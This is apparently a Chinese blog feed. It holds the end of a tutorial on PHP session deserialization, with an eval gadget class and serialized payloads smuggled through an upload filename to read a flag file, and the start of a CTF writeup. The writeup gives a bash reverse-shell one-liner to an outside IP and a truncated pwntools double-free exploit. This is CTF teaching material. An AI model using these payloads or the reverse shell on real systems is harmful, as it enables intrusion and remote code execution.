<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">//ini_set(&#x27;session.serialize_handler&#x27;,&#x27;php&#x27;);</span><br><span class="line">session_start();</span><br><span class="line">$_SESSION[&#x27;name&#x27;] = $_GET[&#x27;name&#x27;];</span><br><span class="line">echo $_SESSION[&#x27;name&#x27;];</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<p><img src="/2022/11/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/1646988663_622b0d779748192aba6f7-166727395787420.jpeg" alt="img"></p>
<p>为了方便查看，将<code>session</code>存储目录设置为<code>session.save_path = &quot;/www/php_session&quot;</code>，<code>PHPSESSID</code>文件如下</p>
<p>1、文件名</p>
<p>文件名为<code>sess_mpnnbont606f50eb178na451od</code>，其中<code>mpnnbont606f50eb178na451od</code>就是后续请求头中<code>Cookie</code>携带的<code>PHPSESSID</code>的值 (如上图浏览器中已存储)</p>
<p>2、文件内容</p>
<p>php处理器存储格式</p>
<table>
<thead>
<tr>
<th style="text-align:center">键名</th>
<th style="text-align:center">竖线</th>
<th style="text-align:center">经过 serialize() 函数反序列处理的值</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">$_SESSION[‘name’]的键名：name</td>
<td style="text-align:center">|</td>
<td style="text-align:center">s:6:“harden”;</td>
</tr>
</tbody>
</table>
<h4 id="php_binary处理器"><a class="markdownIt-Anchor" href="#php_binary处理器"></a> php_binary处理器</h4>
<p>使用php_binary处理器，即<code>session.serialize_handler = php_binary</code></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">ini_set(&#x27;session.serialize_handler&#x27;,&#x27;php_binary&#x27;);</span><br><span class="line">session_start();</span><br><span class="line"># 为了方便ACSII显示，将键名设置为36个字符长度</span><br><span class="line">$_SESSION[&#x27;namenamenamenamenamenamenamenamename&#x27;] = $_GET[&#x27;name&#x27;];</span><br><span class="line">echo $_SESSION[&#x27;namenamenamenamenamenamenamenamename&#x27;];</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<p>由于三种方式<code>PHPSESSID</code>文件名都是一样的，这里只需要查看文件内容</p>
<p><img src="/2022/11/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/1646988665_622b0d79304714550f427-166727395787421.jpeg" alt="img"></p>
<table>
<thead>
<tr>
<th style="text-align:center">键名的长度对应的 ASCII 字符</th>
<th style="text-align:center">键名</th>
<th style="text-align:center">经过 serialize() 函数反序列处理的值.</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">$</td>
<td style="text-align:center">namenamenamenamenamenamenamenamename</td>
<td style="text-align:center">s:6:“harden”;</td>
</tr>
</tbody>
</table>
<h4 id="php_serialize-处理器"><a class="markdownIt-Anchor" href="#php_serialize-处理器"></a> php_serialize 处理器</h4>
<p>使用php_binary处理器，即<code>session.serialize_handler = php_serialize</code></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">ini_set(&#x27;session.serialize_handler&#x27;,&#x27;php_serialize&#x27;);</span><br><span class="line">session_start();</span><br><span class="line">$_SESSION[&#x27;name&#x27;] = $_GET[&#x27;name&#x27;];</span><br><span class="line">echo $_SESSION[&#x27;name&#x27;];</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<p>文件内容即经过 serialize() 函数反序列处理的数组，<code>a:1:&#123;s:4:&quot;name&quot;;s:6:&quot;harden&quot;;&#125;</code></p>
<p><img src="/2022/11/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/1646988666_622b0d7a2a04733d2da9c-166727395787422.jpeg" alt="img"></p>
<h4 id="session的反序列化漏洞利用"><a class="markdownIt-Anchor" href="#session的反序列化漏洞利用"></a> session的反序列化漏洞利用</h4>
<p>session的反序列化漏洞，就是利用<code>php</code>处理器和<code>php_serialize</code>处理器的存储格式差异而产生，通过具体的代码我们来看下漏洞出现的原因</p>
<h4 id="漏洞成因"><a class="markdownIt-Anchor" href="#漏洞成因"></a> 漏洞成因</h4>
<p>首先创建<code>session.php</code>，使用<code>php_serialize</code>处理器来存储session数据</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">ini_set(&#x27;session.serialize_handler&#x27;,&#x27;php_serialize&#x27;);</span><br><span class="line">session_start();</span><br><span class="line">$_SESSION[&#x27;session&#x27;] = $_GET[&#x27;session&#x27;];</span><br><span class="line">echo $_SESSION[&#x27;session&#x27;];</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<p><code>test.php</code>，使用默认<code>php</code>处理器来存储session数据</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">session_start();</span><br><span class="line">class f4ke&#123;</span><br><span class="line">    public $name;</span><br><span class="line">    function __wakeup()&#123;</span><br><span class="line">      echo &quot;Who are you?&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">    function __destruct()&#123;</span><br><span class="line">      eval($this-&gt;name);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$str = new f4ke();</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<p>接着，我们构建URL进行访问<code>session.php</code>：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://www.session-serialize.com/session.php?session=|O:4:&quot;f4ke&quot;:1:&#123;s:4:&quot;name&quot;;s:10:&quot;phpinfo();&quot;;&#125;</span><br></pre></td></tr></table></figure>
<p><img src="/2022/11/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/1646988667_622b0d7b189aa37924788-166727395787423.jpeg" alt="img"></p>
<p>打开<code>PHPSESSID</code>文件可看到序列化存储的内容</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">a:1:&#123;s:7:&quot;session&quot;;s:45:&quot;|O:4:&quot;f4ke&quot;:1:&#123;s:4:&quot;name&quot;;s:10:&quot;phpinfo();&quot;;&#125;</span><br></pre></td></tr></table></figure>
<p><img src="/2022/11/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/1646988668_622b0d7c24506b56b24cc-166727395787424.jpeg" alt="img"></p>
<p>漏洞分析：</p>
<blockquote>
<p>在<code>session.php</code>程序执行，我们将<code>|O:4:&quot;f4ke&quot;:1:&#123;s:4:&quot;name&quot;;s:10:&quot;phpinfo();&quot;;&#125;</code>通过<code>php_serialize</code>处理器序列化保存成<code>PHPSESSID</code>文件；</p>
<p>由于浏览器中保存的<code>PHPSESSID</code>文件名不变，当我们访问<code>test.php</code>，<code>session_start();</code>找到<code>PHPSESSID</code>文件并使用<code>php</code>处理器反序列化文件内容，识别格式即</p>
<table>
<thead>
<tr>
<th style="text-align:center">键名</th>
<th style="text-align:center">竖线</th>
<th style="text-align:center">经过 serialize() 函数反序列处理的值</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">a:1:{s:7:“session”;s:45:&quot;</td>
<td style="text-align:center">|</td>
<td style="text-align:center">O:4:“f4ke”:1:{s:4:“name”;s:10:“phpinfo();”;}</td>
</tr>
</tbody>
</table>
<p>php处理器会以|作为分隔符，将<code>O:4:&quot;f4ke&quot;:1:&#123;s:4:&quot;name&quot;;s:10:&quot;phpinfo();&quot;;&#125;</code>反序列化，就会触发<code>__wakeup()</code>方法，最后对象销毁执行<code>__destruct()</code>方法中的<code>eval()</code>函数，相当于执行如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$_SESSION[&#x27;session&#x27;] = new f4ke();</span><br><span class="line">$_SESSION[&#x27;session&#x27;]-&gt;name = &#x27;phpinfo();&#x27;;</span><br></pre></td></tr></table></figure>
</blockquote>
<p>我们访问<code>test.php</code>，即可直接执行<code>phpinfo()</code>函数</p>
<p><img src="/2022/11/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/1646988669_622b0d7d70e697142e89d-166727395787425.jpeg" alt="img"></p>
<h4 id="ctf例题phpinfo"><a class="markdownIt-Anchor" href="#ctf例题phpinfo"></a> CTF例题：PHPINFO</h4>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">题目地址：http://web.jarvisoj.com:32784/index.php</span><br><span class="line">&lt;?php</span><br><span class="line">//A webshell is wait for you</span><br><span class="line">ini_set(&#x27;session.serialize_handler&#x27;, &#x27;php&#x27;);</span><br><span class="line">session_start();</span><br><span class="line">class OowoO</span><br><span class="line">&#123;</span><br><span class="line">    public $mdzz;</span><br><span class="line">    function __construct()</span><br><span class="line">    &#123;</span><br><span class="line">        $this-&gt;mdzz = &#x27;phpinfo();&#x27;;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    function __destruct()</span><br><span class="line">    &#123;</span><br><span class="line">        eval($this-&gt;mdzz);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">if(isset($_GET[&#x27;phpinfo&#x27;]))</span><br><span class="line">&#123;</span><br><span class="line">    $m = new OowoO();</span><br><span class="line">&#125;</span><br><span class="line">else</span><br><span class="line">&#123;</span><br><span class="line">    highlight_string(file_get_contents(&#x27;index.php&#x27;));</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<p>我们可以看到<code>ini_set('session.serialize_handler', 'php')</code>，判断可能存在session反序列化漏洞，根据代码逻辑，访问URL加上<code>phpinfo</code>参数新建对象触发魔术方法执行<code>phpinfo()</code>函数，进一步查看<code>session.serialize_handler</code>配置</p>
<p><img src="/2022/11/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/1646988670_622b0d7ecd9a84139855d-166727395787426.jpeg" alt="img"></p>
<p>可见<code>php.ini</code>中<code>session.serialize_handler = php_serialize</code>，当前目录中被设置为<code>session.serialize_handler = php</code>，因此存在session反序列化利用的条件</p>
<p>补充知识</p>
<blockquote>
<p>phpinfo文件中</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">local value(局部变量：作用于当前目录程序，会覆盖master value内容):php</span><br><span class="line">master value(主变量：php.ini里面的内容):php_serialize</span><br></pre></td></tr></table></figure>
</blockquote>
<p>那么我们如何找到代码入口将利用代码写入到<code>session</code>文件？想要写入<code>session</code>文件就得想办法在<code>$_SESSION</code>变量中增加我们可控的输入点</p>
<p>补充知识</p>
<blockquote>
<p><strong>Session 上传进度</strong>(此特性自 PHP 5.4.0 后可用)</p>
<p>当 <a href="https://www.php.net/manual/zh/session.configuration.php#ini.session.upload-progress.enabled">session.upload_progress.enabled</a>INI 选项开启时，PHP 能够在每一个文件上传时监测上传进度。 这个信息对上传请求自身并没有什么帮助，但在文件上传时应用可以发送一个POST请求到终端（例如通过XHR）来检查这个状态</p>
<p>当一个上传在处理中，同时POST一个与INI中设置的<code>session.upload_progress.name</code>同名变量时，上传进度可以在[<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mrow></mrow><mi>S</mi></msub><mi>E</mi><mi>S</mi><mi>S</mi><mi>I</mi><mi>O</mi><mi>N</mi><mo stretchy="false">]</mo><mo stretchy="false">(</mo><mi>h</mi><mi>t</mi><mi>t</mi><mi>p</mi><mi>s</mi><mo>:</mo><mi mathvariant="normal">/</mi><mi mathvariant="normal">/</mi><mi>w</mi><mi>w</mi><mi>w</mi><mi mathvariant="normal">.</mi><mi>p</mi><mi>h</mi><mi>p</mi><mi mathvariant="normal">.</mi><mi>n</mi><mi>e</mi><mi>t</mi><mi mathvariant="normal">/</mi><mi>m</mi><mi>a</mi><mi>n</mi><mi>u</mi><mi>a</mi><mi>l</mi><mi mathvariant="normal">/</mi><mi>z</mi><mi>h</mi><mi mathvariant="normal">/</mi><mi>r</mi><mi>e</mi><mi>s</mi><mi>e</mi><mi>r</mi><mi>v</mi><mi>e</mi><mi>d</mi><mi mathvariant="normal">.</mi><mi>v</mi><mi>a</mi><mi>r</mi><mi>i</mi><mi>a</mi><mi>b</mi><mi>l</mi><mi>e</mi><mi>s</mi><mi mathvariant="normal">.</mi><mi>s</mi><mi>e</mi><mi>s</mi><mi>s</mi><mi>i</mi><mi>o</mi><mi>n</mi><mi mathvariant="normal">.</mi><mi>p</mi><mi>h</mi><mi>p</mi><mo stretchy="false">)</mo><mtext>中获得。当</mtext><mi>P</mi><mi>H</mi><mi>P</mi><mtext>检测到这种</mtext><mi>P</mi><mi>O</mi><mi>S</mi><mi>T</mi><mtext>请求时，它会在</mtext><mi mathvariant="normal">‘</mi></mrow><annotation encoding="application/x-tex">_SESSION](https://www.php.net/manual/zh/reserved.variables.session.php)中获得。 当PHP检测到这种POST请求时，它会在`</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord"><span></span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.32833099999999993em;"><span style="top:-2.5500000000000003em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.05764em;">S</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord mathnormal" style="margin-right:0.05764em;">E</span><span class="mord mathnormal" style="margin-right:0.05764em;">S</span><span class="mord mathnormal" style="margin-right:0.05764em;">S</span><span class="mord mathnormal" style="margin-right:0.07847em;">I</span><span class="mord mathnormal" style="margin-right:0.02778em;">O</span><span class="mord mathnormal" style="margin-right:0.10903em;">N</span><span class="mclose">]</span><span class="mopen">(</span><span class="mord mathnormal">h</span><span class="mord mathnormal">t</span><span class="mord mathnormal">t</span><span class="mord mathnormal">p</span><span class="mord mathnormal">s</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">:</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">/</span><span class="mord">/</span><span class="mord mathnormal" style="margin-right:0.02691em;">w</span><span class="mord mathnormal" style="margin-right:0.02691em;">w</span><span class="mord mathnormal" style="margin-right:0.02691em;">w</span><span class="mord">.</span><span class="mord mathnormal">p</span><span class="mord mathnormal">h</span><span class="mord mathnormal">p</span><span class="mord">.</span><span class="mord mathnormal">n</span><span class="mord mathnormal">e</span><span class="mord mathnormal">t</span><span class="mord">/</span><span class="mord mathnormal">m</span><span class="mord mathnormal">a</span><span class="mord mathnormal">n</span><span class="mord mathnormal">u</span><span class="mord mathnormal">a</span><span class="mord mathnormal" style="margin-right:0.01968em;">l</span><span class="mord">/</span><span class="mord mathnormal" style="margin-right:0.04398em;">z</span><span class="mord mathnormal">h</span><span class="mord">/</span><span class="mord mathnormal" style="margin-right:0.02778em;">r</span><span class="mord mathnormal">e</span><span class="mord mathnormal">s</span><span class="mord mathnormal">e</span><span class="mord mathnormal" style="margin-right:0.02778em;">r</span><span class="mord mathnormal" style="margin-right:0.03588em;">v</span><span class="mord mathnormal">e</span><span class="mord mathnormal">d</span><span class="mord">.</span><span class="mord mathnormal" style="margin-right:0.03588em;">v</span><span class="mord mathnormal">a</span><span class="mord mathnormal" style="margin-right:0.02778em;">r</span><span class="mord mathnormal">i</span><span class="mord mathnormal">a</span><span class="mord mathnormal">b</span><span class="mord mathnormal" style="margin-right:0.01968em;">l</span><span class="mord mathnormal">e</span><span class="mord mathnormal">s</span><span class="mord">.</span><span class="mord mathnormal">s</span><span class="mord mathnormal">e</span><span class="mord mathnormal">s</span><span class="mord mathnormal">s</span><span class="mord mathnormal">i</span><span class="mord mathnormal">o</span><span class="mord mathnormal">n</span><span class="mord">.</span><span class="mord mathnormal">p</span><span class="mord mathnormal">h</span><span class="mord mathnormal">p</span><span class="mclose">)</span><span class="mord cjk_fallback">中</span><span class="mord cjk_fallback">获</span><span class="mord cjk_fallback">得</span><span class="mord cjk_fallback">。</span><span class="mord cjk_fallback">当</span><span class="mord mathnormal" style="margin-right:0.13889em;">P</span><span class="mord mathnormal" style="margin-right:0.08125em;">H</span><span class="mord mathnormal" style="margin-right:0.13889em;">P</span><span class="mord cjk_fallback">检</span><span class="mord cjk_fallback">测</span><span class="mord cjk_fallback">到</span><span class="mord cjk_fallback">这</span><span class="mord cjk_fallback">种</span><span class="mord mathnormal" style="margin-right:0.13889em;">P</span><span class="mord mathnormal" style="margin-right:0.02778em;">O</span><span class="mord mathnormal" style="margin-right:0.05764em;">S</span><span class="mord mathnormal" style="margin-right:0.13889em;">T</span><span class="mord cjk_fallback">请</span><span class="mord cjk_fallback">求</span><span class="mord cjk_fallback">时</span><span class="mord cjk_fallback">，</span><span class="mord cjk_fallback">它</span><span class="mord cjk_fallback">会</span><span class="mord cjk_fallback">在</span><span class="mord">‘</span></span></span></span>_SESSION`中添加一组数据, 索引是 <a href="https://www.php.net/manual/zh/session.configuration.php#ini.session.upload-progress.prefix">session.upload_progress.prefix</a>与 <a href="https://www.php.net/manual/zh/session.configuration.php#ini.session.upload-progress.name">session.upload_progress.name</a>连接在一起的值。</p>
</blockquote>
<p>翻译成人话就是，当检测Session 上传进度这一特性是开启状态，我们可以在客户端写一个文件上传的功能，文件上传的同时，<code>POST</code>一个与<code>php.ini</code>中设置的<code>session.upload_progress.name</code>同名变量<code>PHP_SESSION_UPLOAD_PROGRESS</code>，如下图，即可写入<code>$_SESSION</code>，进一步序列化写入<code>session</code>文件</p>
<p><img src="/2022/11/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/1646988672_622b0d80327a70a064145-166727395787427.jpeg" alt="img"></p>
<p>下面是官方给出的一个文件上传时监测进度例子:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;form action=&quot;upload.php&quot; method=&quot;POST&quot; enctype=&quot;multipart/form-data&quot;&gt;</span><br><span class="line"> &lt;input type=&quot;hidden&quot; name=&quot;&lt;?php echo ini_get(&quot;session.upload_progress.name&quot;); ?&gt;&quot; value=&quot;123&quot; /&gt;</span><br><span class="line"> &lt;input type=&quot;file&quot; name=&quot;file1&quot; /&gt;</span><br><span class="line"> &lt;input type=&quot;file&quot; name=&quot;file2&quot; /&gt;</span><br><span class="line"> &lt;input type=&quot;submit&quot; /&gt;</span><br><span class="line">&lt;/form&gt;</span><br></pre></td></tr></table></figure>
<p>其中<code>name=&quot;&quot;</code>也可以设置为<code>name=&quot;PHP_SESSION_UPLOAD_PROGRESS&quot;</code></p>
<p>在session中存储的上传进度，如下所示:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$_SESSION[&quot;upload_progress_123&quot;] = array(</span><br><span class="line"> &quot;start_time&quot; =&gt; 1234567890,   // The request time  请求时间</span><br><span class="line"> &quot;content_length&quot; =&gt; 57343257, // POST content length 长度</span><br><span class="line"> &quot;bytes_processed&quot; =&gt; 453489,  // Amount of bytes received and processed 已接收字节</span><br><span class="line"> &quot;done&quot; =&gt; false,              // true when the POST handler has finished, successfully or not 是否上传完成</span><br><span class="line"> &quot;files&quot; =&gt; array(//上传的文件</span><br><span class="line">  0 =&gt; array(</span><br><span class="line">   &quot;field_name&quot; =&gt; &quot;file1&quot;,       // Name of the &lt;input/&gt; field  input中设定的变量名</span><br><span class="line">   // The following 3 elements equals those in $_FILES             </span><br><span class="line">   &quot;name&quot; =&gt; &quot;foo.avi&quot;,           //文件名</span><br><span class="line">   &quot;tmp_name&quot; =&gt; &quot;/tmp/phpxxxxxx&quot;,</span><br><span class="line">   &quot;error&quot; =&gt; 0,</span><br><span class="line">   &quot;done&quot; =&gt; true,                // True when the POST handler has finished handling this file</span><br><span class="line">   &quot;start_time&quot; =&gt; 1234567890,    // When this file has started to be processed</span><br><span class="line">   &quot;bytes_processed&quot; =&gt; 57343250, // Amount of bytes received and processed for this file</span><br><span class="line">  ),</span><br><span class="line">  // An other file, not finished uploading, in the same request</span><br><span class="line">  1 =&gt; array(</span><br><span class="line">   &quot;field_name&quot; =&gt; &quot;file2&quot;,</span><br><span class="line">   &quot;name&quot; =&gt; &quot;bar.avi&quot;,</span><br><span class="line">   &quot;tmp_name&quot; =&gt; NULL,</span><br><span class="line">   &quot;error&quot; =&gt; 0,</span><br><span class="line">   &quot;done&quot; =&gt; false,</span><br><span class="line">   &quot;start_time&quot; =&gt; 1234567899,</span><br><span class="line">   &quot;bytes_processed&quot; =&gt; 54554,</span><br><span class="line">  ),</span><br><span class="line"> )</span><br><span class="line">);</span><br></pre></td></tr></table></figure>
<p>其中，session中的<code>field_name</code>和<code>name</code>都是我们可控的输入点！</p>
<p>下面我们就开始解题拿到flag</p>
<p>首先，<code>http://web.jarvisoj.com:32784/index.php?phpinfo</code>查询设置</p>
<p><img src="/2022/11/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/1646988673_622b0d81b3576c202ffb5-166727395787428.jpeg" alt="img"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">session.upload_progress.enabled = On   --表明允许上传进度跟踪，并填充$ _SESSION变量</span><br><span class="line">session.upload_progress.cleanup = Off  --表明所有POST数据（即完成上传）后，不清理进度信息($ _SESSION变量)</span><br></pre></td></tr></table></figure>
<p>即允许上传进度跟踪且结束后不清除数据，更有利使用<code>session.upload_progress.name</code>来将利用代码写入<code>session</code>文件</p>
<p>构造<code>POST</code>表单提交上传文件</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;form action=&quot;http://web.jarvisoj.com:32784/index.php&quot; method=&quot;POST&quot; enctype=&quot;multipart/form-data&quot;&gt;</span><br><span class="line"> &lt;input type=&quot;hidden&quot; name=&quot;PHP_SESSION_UPLOAD_PROGRESS&quot; value=&quot;123&quot; /&gt;</span><br><span class="line"> &lt;input type=&quot;file&quot; name=&quot;file&quot; /&gt;</span><br><span class="line"> &lt;input type=&quot;submit&quot; /&gt;</span><br><span class="line">&lt;/form&gt;</span><br></pre></td></tr></table></figure>
<p>构造序列化字符串作为<code>payload</code>（利用代码）</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class OowoO</span><br><span class="line">&#123;</span><br><span class="line">    public $mdzz=&#x27;print_r(scandir(dirname(__FILE__)));&#x27;;</span><br><span class="line">&#125;</span><br><span class="line">$obj = new OowoO();</span><br><span class="line">echo serialize($obj);</span><br><span class="line">?&gt;</span><br><span class="line">//O:5:&quot;OowoO&quot;:1:&#123;s:4:&quot;mdzz&quot;;s:36:&quot;print_r(scandir(dirname(__FILE__)));&quot;;&#125;</span><br></pre></td></tr></table></figure>
<p>为了防止<code>&quot;</code>被转义，我们在<code>payload</code>中加入<code>\</code></p>
<p>随意选择文件，点击表单提交，使用抓包工具<code>burpsuite</code>抓取请求包</p>
<p><img src="/2022/11/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/1646988675_622b0d835c272ae8697f2-166727395787429.jpeg" alt="img"></p>
<p>并修改<code>filename</code>值为</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">|O:5:\&quot;OowoO\&quot;:1:&#123;s:4:\&quot;mdzz\&quot;;s:36:\&quot;print_r(scandir(dirname(__FILE__)));\&quot;;&#125;</span><br></pre></td></tr></table></figure>
<p>发送请求包，代码执行过程分析：</p>
<p><img src="/2022/11/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/1646988677_622b0d854159ffbe9883d-166727395787430.jpeg" alt="img"></p>
<p>因此直接执行<code>print_r(scandir(dirname(__FILE__)));</code>并返回</p>
<p><img src="/2022/11/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/1646988680_622b0d88d2b3473a44731-166727395787431.jpeg" alt="img"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">phpinfo`查看当前目录，`/opt/lampp/htdocs/</span><br></pre></td></tr></table></figure>
<p><img src="/2022/11/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/1646988683_622b0d8b6fba70304dd15-166727395787432.jpeg" alt="img"></p>
<p>构造最终<code>payload</code>读取<code>Here_1s_7he_fl4g_buT_You_Cannot_see.php</code>文件内容，即flag</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">|O:5:\&quot;OowoO\&quot;:1:&#123;s:4:\&quot;mdzz\&quot;;s:88:\&quot;print_r(file_get_contents(\&quot;/opt/lampp/htdocs/Here_1s_7he_fl4g_buT_You_Cannot_see.php\&quot;));\&quot;;&#125;</span><br></pre></td></tr></table></figure>
<p><img src="/2022/11/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/1646988684_622b0d8cd166d59b7b4d2-166727395787433.jpeg" alt="img"></p>
<h3 id="框架链子"><a class="markdownIt-Anchor" href="#框架链子"></a> 框架链子</h3>
<p>还有一些框架转有的链子，详情遇到再说哦，这里就不过多阐述了QwQ。</p>
<p>祝师傅们，反序列化玩的开心~</p>
]]></content>
      <categories>
        <category>反序列化</category>
      </categories>
      <tags>
        <tag>PHP</tag>
        <tag>反序列化</tag>
      </tags>
  </entry>
  <entry>
    <title>羊城杯2022-Writeup</title>
    <url>/2022/09/%E7%BE%8A%E5%9F%8E%E6%9D%AF2022-Writeup/</url>
    <content><![CDATA[<h1 id="羊城杯2022writeup"><a class="markdownIt-Anchor" href="#羊城杯2022writeup"></a> 羊城杯2022–Writeup</h1>
<p>​                                                                                                                            -------TWe1v3、1amfree、scr1pt_k1ddi3</p>
<hr>
<p>这个比赛太累了可，凌晨三点碰着枕头就睡着了，不过收获也蛮多的，这次题目很友好，不像wmCTF一样坐大牢。感谢两位大哥的实力带飞，太菜了我。全靠躺。</p>
<span id="more"></span>          
<p><img src="/2022/09/%E7%BE%8A%E5%9F%8E%E6%9D%AF2022-Writeup/1280X1280.PNG" alt="排行榜"></p>
<h2 id="pwn"><a class="markdownIt-Anchor" href="#pwn"></a> Pwn</h2>
<h3 id="ycbsql"><a class="markdownIt-Anchor" href="#ycbsql"></a> YCBSQL</h3>
<p>这个应该是有了非预期，可以直接调用shell，我们直接反弹就行。</p>
<p><img src="/2022/09/%E7%BE%8A%E5%9F%8E%E6%9D%AF2022-Writeup/1.PNG" alt="1"></p>
<p>Payload:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">.system bash -c <span class="string">&quot;bash -i  &gt;&amp;/dev/tcp/101.43.255.238/7777 0&gt;&amp;1&quot;</span></span><br></pre></td></tr></table></figure>
<p><img src="/2022/09/%E7%BE%8A%E5%9F%8E%E6%9D%AF2022-Writeup/2.PNG" alt="2"></p>
<h3 id="ez_linklist-v2"><a class="markdownIt-Anchor" href="#ez_linklist-v2"></a> ez_linklist-v2</h3>
<p>这个题目的漏洞就是在unlink的时候如果是unlink的头指针，那么后面的指针没有清空，就会是这样：</p>
<p><img src="/2022/09/%E7%BE%8A%E5%9F%8E%E6%9D%AF2022-Writeup/1280X1280%20(3).PNG" alt="1280X1280 (3)"></p>
<p>然后在free函数的时候，如果offset是0xff，那么后面的指针就都能释放掉，因此就会产生double free。</p>
<p><img src="/2022/09/%E7%BE%8A%E5%9F%8E%E6%9D%AF2022-Writeup/1280X1280%20(4).PNG" alt="1280X1280 (4)"></p>
<p>所以实际上就是一个double free的利用。这里我一开始是用的9.7的libc，之后直接改成9.2的就行。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment"># r=process(&quot;/home/ubuntu/pwn/比赛/羊城杯/pwn/pwn&quot;)</span></span><br><span class="line">r=remote(<span class="string">&quot;tcp.dasc.buuoj.cn&quot;</span>,<span class="number">23916</span>)</span><br><span class="line">elf=ELF(<span class="string">&quot;/home/ubuntu/pwn/比赛/羊城杯/pwn/pwn&quot;</span>)</span><br><span class="line"><span class="comment"># libc=ELF(&quot;/home/ubuntu/glibc-all-in-one/libs/2.31-0ubuntu9.7_amd64/libc.so.6&quot;)</span></span><br><span class="line">libc=ELF(<span class="string">&quot;/home/ubuntu/pwn/比赛/羊城杯/pwn/libc.so.6&quot;</span>)</span><br><span class="line">context(arch=<span class="string">&quot;amd64&quot;</span>,os=<span class="string">&quot;linux&quot;</span>,log_level=<span class="string">&quot;debug&quot;</span>)</span><br><span class="line">context.terminal = [<span class="string">&#x27;gnome-terminal&#x27;</span>,<span class="string">&#x27;-x&#x27;</span>,<span class="string">&#x27;sh&#x27;</span>,<span class="string">&#x27;-c&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">meau</span>(<span class="params">index</span>):</span><br><span class="line">    r.sendlineafter(<span class="string">&quot;Your choice:&quot;</span>,<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">size,content</span>):</span><br><span class="line">    meau(<span class="number">1</span>)</span><br><span class="line">    r.sendlineafter(<span class="string">&quot;Size:&quot;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">    r.sendafter(<span class="string">&quot;Content:&quot;</span>,content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span 